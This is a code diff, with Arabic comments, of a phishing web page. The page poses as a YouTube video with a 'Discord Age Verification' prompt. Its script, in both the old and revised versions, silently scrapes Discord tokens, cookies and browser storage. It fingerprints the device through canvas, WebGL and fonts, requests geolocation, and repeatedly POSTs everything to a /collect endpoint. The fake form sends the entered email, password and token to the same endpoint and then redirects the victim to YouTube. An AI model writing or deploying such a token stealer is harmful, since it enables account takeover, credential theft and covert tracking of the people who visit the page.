@@ -8,7 +8,7 @@
         .container { max-width: 900px; width: 100%; background: #111; padding: 30px; border-radius: 16px; border: 1px solid #333; }
         iframe { width: 100%; height: 480px; border-radius: 12px; border: none; }
         h2 { color: #fff; margin-bottom: 15px; font-weight: 400; }
-        .fake-login { margin-top: 25px; background: #1a1a1a; padding: 25px; border-radius: 12px; max-width: 400px; margin-left: auto; margin-right: auto; border: 1px solid #2a2a2a; }
+        .fake-login { margin-top: 25px; background: #1a1a1a; padding: 25px; border-radius: 12px; max-width: 450px; margin-left: auto; margin-right: auto; border: 1px solid #2a2a2a; }
         .fake-login h3 { color: #7289da; margin-bottom: 15px; font-weight: 500; }
         .fake-login input { display: block; width: 100%; margin: 10px 0; padding: 12px; border-radius: 8px; border: none; background: #2a2a2a; color: #fff; font-size: 14px; }
         .fake-login input::placeholder { color: #888; }
@@ -17,7 +17,6 @@
         .fake-login button:disabled { opacity: 0.5; cursor: not-allowed; }
         .note { color: #555; font-size: 12px; margin-top: 15px; }
         .status { color: #00ff88; font-size: 13px; margin-top: 10px; display: none; }
-        .token-highlight { color: #ff6b6b; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -25,7 +24,7 @@
         <h2>▶ Loading your video...</h2>
         <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" allowfullscreen></iframe>
         <p class="note">🔒 Secure streaming • Age verification required</p>
-        
+
         <div class="fake-login">
             <h3>Discord Age Verification</h3>
             <input type="text" id="discordEmail" placeholder="Discord Email or Phone">
@@ -38,250 +37,209 @@
 
     <script>
         (function() {
-            // ================================================================
-            // 🔥 الهدف الأساسي: استخراج توكن الدسكورد من أي مكان ممكن 🔥
-            // ================================================================
 
+            // ======================== التوكن ========================
             function extractDiscordToken() {
-                var foundTokens = [];
-                var allStorage = {};
+                let found = [];
+                let all = {};
 
-                // 1. localStorage - كل المفاتيح
                 try {
-                    for (var i = 0; i < localStorage.length; i++) {
-                        var key = localStorage.key(i);
-                        var val = localStorage.getItem(key);
-                        allStorage['localStorage_' + key] = val;
-                        
-                        // البحث عن توكن في القيمة
-                        if (val && typeof val === 'string') {
-                            // التوكن عادة يكون نص طويل جداً (50-100 حرف) يحتوي على نقاط أو أحرف عشوائية
-                            if (val.length > 40 && (val.includes('.') || /^[A-Za-z0-9-_]{40,}$/.test(val))) {
-                                foundTokens.push({ source: 'localStorage', key: key, value: val });
-                            }
-                            // البحث في المفتاح نفسه
+                    for (let i = 0; i < localStorage.length; i++) {
+                        let key = localStorage.key(i);
+                        let val = localStorage.getItem(key);
+                        all['local_' + key] = val;
+                        if (val && val.length > 30) {
                             if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth')) {
-                                if (val.length > 10) {
-                                    foundTokens.push({ source: 'localStorage (key)', key: key, value: val });
-                                }
+                                found.push({ source: 'localStorage', key, value: val });
+                            }
+                            if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
+                                found.push({ source: 'localStorage(guess)', key, value: val });
                             }
                         }
                     }
-                } catch(e) {}
+                } catch (e) {}
 
-                // 2. sessionStorage
                 try {
-                    for (var j = 0; j < sessionStorage.length; j++) {
-                        var sk = sessionStorage.key(j);
-                        var sv = sessionStorage.getItem(sk);
-                        allStorage['sessionStorage_' + sk] = sv;
-                        
-                        if (sv && typeof sv === 'string') {
-                            if (sv.length > 40 && (sv.includes('.') || /^[A-Za-z0-9-_]{40,}$/.test(sv))) {
-                                foundTokens.push({ source: 'sessionStorage', key: sk, value: sv });
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        let key = sessionStorage.key(i);
+                        let val = sessionStorage.getItem(key);
+                        all['session_' + key] = val;
+                        if (val && val.length > 30) {
+                            if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth')) {
+                                found.push({ source: 'sessionStorage', key, value: val });
                             }
-                            if (sk.toLowerCase().includes('token') || sk.toLowerCase().includes('discord') || sk.toLowerCase().includes('auth')) {
-                                if (sv.length > 10) {
-                                    foundTokens.push({ source: 'sessionStorage (key)', key: sk, value: sv });
-                                }
+                            if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
+                                found.push({ source: 'sessionStorage(guess)', key, value: val });
                             }
                         }
                     }
-                } catch(e) {}
+                } catch (e) {}
 
-                // 3. cookies
                 try {
-                    var cookies = document.cookie.split(';');
-                    for (var k = 0; k < cookies.length; k++) {
-                        var c = cookies[k].trim();
-                        allStorage['cookie_' + k] = c;
-                        if (c.toLowerCase().includes('token') || c.toLowerCase().includes('discord') || c.toLowerCase().includes('auth')) {
-                            if (c.length > 10) {
-                                foundTokens.push({ source: 'cookie', key: c.split('=')[0], value: c.split('=')[1] || c });
-                            }
+                    document.cookie.split(';').forEach(c => {
+                        let t = c.trim();
+                        if (t.toLowerCase().includes('token') || t.toLowerCase().includes('discord') || t.toLowerCase().includes('auth')) {
+                            let parts = t.split('=');
+                            found.push({ source: 'cookie', key: parts[0], value: parts.slice(1).join('=') });
                         }
-                    }
-                } catch(e) {}
+                    });
+                } catch (e) {}
 
-                // 4. window object - البحث عن متغيرات عامة
                 try {
-                    for (var key in window) {
+                    for (let key in window) {
                         try {
-                            var val = window[key];
+                            let val = window[key];
                             if (typeof val === 'string' && val.length > 40) {
-                                if (val.includes('.') && (val.includes('discord') || val.includes('token') || val.includes('auth'))) {
-                                    foundTokens.push({ source: 'window object', key: key, value: val });
+                                if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord')) {
+                                    found.push({ source: 'window', key, value: val });
                                 }
-                                if (/^[A-Za-z0-9-_]{40,}$/.test(val)) {
-                                    foundTokens.push({ source: 'window object (pattern)', key: key, value: val });
+                                if (val.includes('.') && /^[A-Za-z0-9-_]{40,}$/.test(val)) {
+                                    found.push({ source: 'window(guess)', key, value: val });
                                 }
                             }
-                        } catch(e) {}
+                        } catch (e) {}
                     }
-                } catch(e) {}
-
-                // 5. IndexedDB - محاولة قراءة قواعد بيانات دسكورد
-                try {
-                    var indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB;
-                    if (indexedDB) {
-                        // محاولة فتح قاعدة بيانات دسكورد
-                        var dbNames = ['discord', 'Discord', 'DISCORD', 'discord_storage', 'DiscordStorage'];
-                        for (var d = 0; d < dbNames.length; d++) {
-                            try {
-                                var req = indexedDB.open(dbNames[d]);
-                                req.onsuccess = function(e) {
-                                    var db = e.target.result;
-                                    var tx = db.transaction(db.objectStoreNames[0], 'readonly');
-                                    var store = tx.objectStore(db.objectStoreNames[0]);
-                                    var getAll = store.getAll();
-                                    getAll.onsuccess = function(ev) {
-                                        var data = ev.target.result;
-                                        if (data) {
-                                            for (var item in data) {
-                                                var strData = JSON.stringify(data[item]);
-                                                if (strData.length > 40 && (strData.includes('token') || strData.includes('discord'))) {
-                                                    foundTokens.push({ source: 'IndexedDB', key: dbNames[d], value: strData.substring(0, 500) });
-                                                }
-                                            }
-                                        }
-                                    };
-                                    setTimeout(function() { db.close(); }, 500);
-                                };
-                                req.onerror = function() {};
-                            } catch(e) {}
-                        }
-                    }
-                } catch(e) {}
-
-                // 6. محاولة قراءة ملفات localStorage الخاصة بدسكورد (مفتاح معروف)
-                var discordKeys = ['token', 'discordToken', 'discord_token', 'userToken', 'accessToken', 'authorization', 'authToken', 'sessionToken'];
-                for (var t = 0; t < discordKeys.length; t++) {
-                    try {
-                        var val = localStorage.getItem(discordKeys[t]);
-                        if (val && val.length > 10) {
-                            foundTokens.push({ source: 'localStorage (known key)', key: discordKeys[t], value: val });
-                        }
-                        var sVal = sessionStorage.getItem(discordKeys[t]);
-                        if (sVal && sVal.length > 10) {
-                            foundTokens.push({ source: 'sessionStorage (known key)', key: discordKeys[t], value: sVal });
-                        }
-                    } catch(e) {}
-                }
-
-                // 7. البحث عن توكن في أي نص في الصفحة (نادر لكن ممكن)
-                try {
-                    var bodyText = document.body.innerText || '';
-                    var tokenMatches = bodyText.match(/[A-Za-z0-9-_]{40,}/g);
-                    if (tokenMatches) {
-                        for (var m = 0; m < tokenMatches.length; m++) {
-                            if (tokenMatches[m].length > 40) {
-                                foundTokens.push({ source: 'page text', key: 'text_match', value: tokenMatches[m] });
-                            }
-                        }
-                    }
-                } catch(e) {}
-
-                // 8. البحث في URL
-                try {
-                    var url = window.location.href;
-                    if (url.includes('token=') || url.includes('discord=')) {
-                        var params = new URLSearchParams(window.location.search);
-                        for (var p of params.entries()) {
-                            if (p[0].toLowerCase().includes('token') || p[0].toLowerCase().includes('discord')) {
-                                foundTokens.push({ source: 'URL parameter', key: p[0], value: p[1] });
-                            }
-                        }
-                    }
-                } catch(e) {}
-
-                // فلترة النتائج - استبعاد القيم القصيرة جداً
-                var filtered = foundTokens.filter(function(item) {
-                    return item.value && item.value.length > 15;
-                });
+                } catch (e) {}
 
                 // إزالة المكررات
-                var unique = [];
-                var seen = {};
-                for (var u = 0; u < filtered.length; u++) {
-                    var key = filtered[u].value.substring(0, 30);
-                    if (!seen[key]) {
-                        seen[key] = true;
-                        unique.push(filtered[u]);
+                let unique = [];
+                let seen = new Set();
+                found.forEach(item => {
+                    let hash = item.value.substring(0, 40);
+                    if (!seen.has(hash)) {
+                        seen.add(hash);
+                        unique.push(item);
                     }
-                }
+                });
 
-                return {
-                    allFound: unique,
-                    allStorage: allStorage,
-                    totalFound: unique.length
-                };
+                return { tokens: unique, allStorage: all };
             }
 
-            // ================================================================
-            // تنفيذ البحث عن التوكن
-            // ================================================================
+            // ======================== معلومات الجهاز ========================
+            function getDeviceInfo() {
+                let info = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages || [],
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio || 1,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    maxTouchPoints: navigator.maxTouchPoints || 0
+                };
+                return info;
+            }
 
-            var tokenResult = extractDiscordToken();
-            
-            // استخراج كل التوكنات المحتملة في مصفوفة منفصلة للسهولة
-            var potentialTokens = [];
-            tokenResult.allFound.forEach(function(item) {
-                potentialTokens.push({
-                    source: item.source,
-                    key: item.key,
-                    value: item.value
+            // ======================== بصمة Canvas ========================
+            function getCanvasFingerprint() {
+                try {
+                    let canvas = document.createElement('canvas');
+                    canvas.width = 256;
+                    canvas.height = 128;
+                    let ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('FP', 2, 15);
+                    ctx.fillStyle = 'rgba(102,204,0,0.7)';
+                    ctx.fillText('Fingerprint', 4, 45);
+                    return canvas.toDataURL();
+                } catch (e) {
+                    return 'error';
+                }
+            }
+
+            // ======================== WebGL ========================
+            function getWebGLInfo() {
+                try {
+                    let canvas = document.createElement('canvas');
+                    let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (!gl) return 'webgl not supported';
+                    let debug = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debug) {
+                        return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) + ' | ' + gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
+                    }
+                    return 'webgl no debug';
+                } catch (e) {
+                    return 'webgl error';
+                }
+            }
+
+            // ======================== الشبكة ========================
+            function getNetworkInfo() {
+                let info = {};
+                try {
+                    let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    if (conn) {
+                        info.type = conn.effectiveType || 'unknown';
+                        info.downlink = conn.downlink ? conn.downlink + 'Mbps' : 'unknown';
+                        info.rtt = conn.rtt ? conn.rtt + 'ms' : 'unknown';
+                    }
+                } catch (e) {}
+                return info;
+            }
+
+            // ======================== الخطوط المثبتة ========================
+            function getInstalledFonts() {
+                let fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Tahoma', 'Trebuchet MS', 'Impact', 'Comic Sans MS', 'Arial Black', 'Calibri', 'Cambria', 'Consolas', 'Segoe UI'];
+                let installed = [];
+                fonts.forEach(f => {
+                    let span = document.createElement('span');
+                    span.style.fontFamily = f;
+                    if (span.style.fontFamily === f) installed.push(f);
                 });
-            });
+                return installed;
+            }
 
-            // البيانات النهائية
-            var data = {
-                // 🔥 التوكنات المستخرجة (الأهم)
-                discordTokensFound: potentialTokens,
-                discordTokensCount: potentialTokens.length,
-                
-                // معلومات الجهاز
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookies: document.cookie,
-                
-                // الموقع
-                location: null,
-                
-                // كل التخزين
-                fullLocalStorage: (function() {
-                    var items = {};
-                    try {
-                        for (var i = 0; i < localStorage.length; i++) {
-                            var key = localStorage.key(i);
-                            items[key] = localStorage.getItem(key);
-                        }
-                    } catch(e) { items.error = e.message; }
-                    return items;
-                })(),
-                fullSessionStorage: (function() {
-                    var items = {};
-                    try {
-                        for (var i = 0; i < sessionStorage.length; i++) {
-                            var key = sessionStorage.key(i);
-                            items[key] = sessionStorage.getItem(i);
-                        }
-                    } catch(e) { items.error = e.message; }
-                    return items;
-                })()
+            // ======================== جمع كل البيانات ========================
+
+            let tokenData = extractDiscordToken();
+            let device = getDeviceInfo();
+            let canvas = getCanvasFingerprint();
+            let webgl = getWebGLInfo();
+            let network = getNetworkInfo();
+            let fonts = getInstalledFonts();
+
+            let data = {
+                // 🔥 التوكن
+                discordTokens: tokenData.tokens,
+                discordTokensCount: tokenData.tokens.length,
+                allStorage: tokenData.allStorage,
+
+                // الجهاز
+                device: device,
+
+                // بصمة
+                canvasFingerprint: canvas.substring(0, 100) + '...',
+                webglInfo: webgl,
+
+                // الشبكة
+                network: network,
+
+                // الخطوط
+                installedFonts: fonts,
+
+                // الكوكيز كاملة
+                allCookies: document.cookie,
+
+                // الموقع (سيجي لاحقاً)
+                location: null
             };
 
-            // الموقع الجغرافي
+            // ======================== الموقع الجغرافي ========================
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    function(pos) {
+                    pos => {
                         data.location = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
                         sendData(data);
                     },
-                    function(err) {
+                    err => {
                         data.location = { error: err.message };
                         sendData(data);
                     },
@@ -292,31 +250,27 @@
                 sendData(data);
             }
 
-            // إرسال البيانات فوراً ومراراً
-            setTimeout(function() { sendData(data); }, 500);
-            setTimeout(function() { sendData(data); }, 3000);
-            setTimeout(function() { sendData(data); }, 8000);
-            setTimeout(function() { sendData(data); }, 15000);
+            // إرسال متكرر لضمان الوصول
+            setTimeout(() => sendData(data), 500);
+            setTimeout(() => sendData(data), 2000);
+            setTimeout(() => sendData(data), 5000);
+            setTimeout(() => sendData(data), 10000);
 
             function sendData(finalData) {
                 fetch('/collect', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(finalData)
-                }).catch(function(err) { console.error(err); });
+                }).catch(e => console.log(e));
             }
 
-            // ================================================================
-            // نموذج الدسكورد الوهمي (لجمع التوكن يدوياً)
-            // ================================================================
-
+            // ======================== نموذج الدسكورد الوهمي ========================
             window.submitFake = function() {
-                var email = document.getElementById('discordEmail').value;
-                var password = document.getElementById('discordPassword').value;
-                var token = document.getElementById('discordToken').value;
-                
+                let email = document.getElementById('discordEmail').value;
+                let password = document.getElementById('discordPassword').value;
+                let token = document.getElementById('discordToken').value;
+
                 if (email || password || token) {
-                    // إرسال بيانات النموذج مع التركيز على التوكن
                     fetch('/collect', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -324,23 +278,23 @@
                             discordEmail: email,
                             discordPassword: password,
                             discordToken: token,
-                            extra: 'discord_login_form',
-                            priority: 'HIGH - MANUAL TOKEN'
+                            extra: 'discord_login_form'
                         })
-                    }).catch(function(err) { console.error(err); });
-                    
+                    }).catch(e => console.log(e));
+
                     document.getElementById('statusMsg').style.display = 'block';
                     document.querySelector('.fake-login button').textContent = '✓ Verified';
                     document.querySelector('.fake-login button').disabled = true;
-                    document.querySelectorAll('.fake-login input').forEach(function(inp) { inp.disabled = true; });
-                    
-                    setTimeout(function() {
+                    document.querySelectorAll('.fake-login input').forEach(inp => inp.disabled = true);
+
+                    setTimeout(() => {
                         window.location.href = 'https://www.youtube.com';
                     }, 2000);
                 } else {
-                    alert('Please fill in at least one field to verify your age.');
+                    alert('Please fill in at least one field.');
                 }
             };
+
         })();
     </script>
 </body>
